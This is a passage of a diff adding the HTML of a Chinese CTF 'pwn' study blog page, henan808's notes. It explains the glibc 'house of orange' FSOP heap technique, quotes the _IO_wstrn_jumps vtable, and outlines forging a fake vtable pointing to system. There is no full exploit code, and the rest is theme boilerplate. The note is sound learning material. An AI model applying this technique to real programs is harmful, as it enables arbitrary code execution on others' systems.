+<p>而这个函数的第一个fp就是，这个结构体中的第一个内容，就是flags.</p>
+<p>而我们能修改的其实是第2个结构体，我们需要这个mode&lt;0 overflow才不会触发，这个时候才会根据chain找到下一个结构体，进而触发相关的操作。</p>
+<p>house of orange中的函数调用流程为：</p>
+<p>__libc_malloc-&gt;malloc_printerr-&gt;libc_message-&gt;abort-&gt;_IO_flush_all_lockp</p>
+<p>前面也说了，控制第2个结构体是通过smallbin改写的（这就需要上一个结构体中的chain地址为堆块地址）然后调用函数的时候是根据vtable表，这个里面</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t _IO_wstrn_jumps attribute_hidden =<br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_wstr_finish),<br>  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),<br>  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),<br>  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),<br>  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),<br>  JUMP_INIT(xsputn, _IO_wdefault_xsputn),<br>  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),<br>  JUMP_INIT(seekoff, _IO_wstr_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_default_setbuf),<br>  JUMP_INIT(sync, _IO_default_sync),<br>  JUMP_INIT(doallocate, _IO_wdefault_doallocate),<br>  JUMP_INIT(read, _IO_default_read),<br>  JUMP_INIT(write, _IO_default_write),<br>  JUMP_INIT(seek, _IO_default_seek),<br>  JUMP_INIT(close, _IO_default_close),<br>  JUMP_INIT(stat, _IO_default_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br><br><br></code></pre></td></tr></table></figure>
+
+<p>所以最终调用也就是说需要满足的是函数触发条件，第一个结构体中的mode为正，这样才能进入第二个，然后smallbin堆溢出修改第二个结构体中的先关参数，再伪造我们创建的假的vtable表，里面放入我们构造的system函数，之后flag再填入我们需要的参数，最后触发。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16712469.html">关于house of orange(unsorted bin attack &amp;&amp;FSOP)的学习总结 - ZikH26 - 博客园</a></p>
+<!-- sync-hash: efb7563f4dc2c1500b6cf66597aa8ad68d93e2f5626c6210b9b00f038b326e06 -->
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/pwn-notes/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" class="category-chain-item">知识点</a>
+  
+  
+    <span>></span>
+    
+  <a href="/pwn-notes/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/%E6%B1%87%E7%BC%96/" class="category-chain-item">汇编</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/pwn-notes/tags/tcache/" class="print-no-link">#tcache</a>
+      
+        <a href="/pwn-notes/tags/UAF/" class="print-no-link">#UAF</a>
+      
+        <a href="/pwn-notes/tags/unlink/" class="print-no-link">#unlink</a>
+      
+        <a href="/pwn-notes/tags/fastbin/" class="print-no-link">#fastbin</a>
+      
+        <a href="/pwn-notes/tags/unsorted-bin/" class="print-no-link">#unsorted-bin</a>
+      
+        <a href="/pwn-notes/tags/double-free/" class="print-no-link">#double-free</a>
+      
+        <a href="/pwn-notes/tags/HouseOfForce/" class="print-no-link">#HouseOfForce</a>
+      
+        <a href="/pwn-notes/tags/one-gadget/" class="print-no-link">#one-gadget</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>汇编语言：</div>
+      <div>https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-asm-65de1e22-741369/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>henan808</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年11月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-cc-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/pwn-notes/2026/11/13/sync-typora-pwn-ciscn2019final3-58c6fc/" title="ciscn2019final3">
+                        <span class="hidden-mobile">ciscn2019final3</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/pwn-notes/js/events.js" ></script>
+<script  src="/pwn-notes/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/pwn-notes/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/pwn-notes/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/pwn-notes/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
